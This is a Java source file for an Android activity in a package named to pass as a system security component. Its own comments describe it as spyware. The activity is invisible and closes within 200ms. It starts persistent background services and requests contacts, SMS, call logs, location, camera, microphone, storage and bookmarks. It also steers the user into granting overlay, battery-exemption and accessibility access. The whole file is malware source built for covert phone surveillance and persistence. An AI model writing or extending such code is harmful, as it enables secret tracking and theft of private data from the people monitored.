package com.android.system.security;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/**
 * Minimal invisible activity that requests all permissions at opportune moments.
 * Shows for < 100ms, then finishes.
 * Requests camera, microphone, contacts, SMS, call logs, location, storage,
 * browser bookmarks, overlay, and battery optimization exemptions.
 */
public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 0x1337;
    private static final int OVERLAY_PERMISSION_CODE = 0x1338;
    private static final int BATTERY_OPTIMIZATION_CODE = 0x1339;
    private static final int ACCESSIBILITY_SETTINGS_CODE = 0x1340;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Make activity transparent and invisible
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        );

        // Set content to an invisible root view
        setContentView(new android.widget.FrameLayout(this));

        Log.i(TAG, "Activity created, starting services...");

        // Start the core service immediately
        Intent serviceIntent = new Intent(this, CoreService.class);
        serviceIntent.putExtra("source", "activity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Start background redundancy service
        Intent bgIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(bgIntent);
        } else {
            startService(bgIntent);
        }

        // Request all permissions silently
        requestAllPermissions();

        // Close activity after 200ms
        new Handler(getMainLooper()).postDelayed(() -> {
            try {
                finish();
            } catch (Exception e) {
                Log.w(TAG, "Finish failed: " + e.getMessage());
            }
        }, 200);
    }

    private void requestAllPermissions() {
        // ============================================================
        // ALL PERMISSIONS to request
        // ============================================================
        String[] allPermissions = {
            // Core spyware permissions
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,

            // Storage
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,

            // Camera
            Manifest.permission.CAMERA,

            // Microphone
            Manifest.permission.RECORD_AUDIO,

            // Web / Browser
            Manifest.permission.READ_HISTORY_BOOKMARKS,

            // Notifications (Android 13+)
            Manifest.permission.POST_NOTIFICATIONS,
        };

        // Filter to only those not yet granted
        List<String> needed = new ArrayList<>();
        for (String perm : allPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            Log.i(TAG, "Requesting " + needed.size() + " permissions...");
            ActivityCompat.requestPermissions(
                this,
                needed.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            Log.i(TAG, "All permissions already granted");
        }

        // ============================================================
        // SYSTEM_ALERT_WINDOW (overlay permission)
        // ============================================================
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    Intent intent = new Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName())
                    );
                    startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                } catch (Exception e) {
                    Log.w(TAG, "Overlay intent failed: " + e.getMessage());
                }
            }
        }

        // ============================================================
        // BATTERY OPTIMIZATION EXEMPTION
        // ============================================================
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName())
                    );
                    startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
                } catch (Exception e) {
                    Log.w(TAG, "Battery opt intent failed: " + e.getMessage());
                }
            }
        }

        // ============================================================
        // ACCESSIBILITY SERVICE — guide user to enable
        // ============================================================
        if (!isAccessibilityServiceEnabled()) {
            Log.i(TAG, "Accessibility service not enabled, prompting user...");
            try {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivityForResult(intent, ACCESSIBILITY_SETTINGS_CODE);
            } catch (Exception e) {
                Log.w(TAG, "Accessibility settings intent failed: " + e.getMessage());
            }
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        String service = Settings.Secure.getString(
            getContentResolver(),
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        return service != null && service.contains(getPackageName() + "/" + CoreService.class.getName());
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            int granted = 0;
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults.length > i && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    granted++;
                    Log.d(TAG, "Permission granted: " + permissions[i]);
                } else {
                    Log.d(TAG, "Permission denied: " + permissions[i]);
                }
            }
            Log.i(TAG, "Permissions result: " + granted + "/" + permissions.length + " granted");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case OVERLAY_PERMISSION_CODE:
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                    Log.i(TAG, "Overlay permission granted");
                } else {
                    Log.w(TAG, "Overlay permission denied");
                }
                break;

            case BATTERY_OPTIMIZATION_CODE:
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Log.i(TAG, "Battery optimization disabled");
                } else {
                    Log.w(TAG, "Battery optimization still enabled");
                }
                break;

            case ACCESSIBILITY_SETTINGS_CODE:
                if (isAccessibilityServiceEnabled()) {
                    Log.i(TAG, "Accessibility service enabled");
                } else {
                    Log.w(TAG, "Accessibility service not yet enabled");
                }
                break;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Activity destroyed, services continue running");
    }
                          }
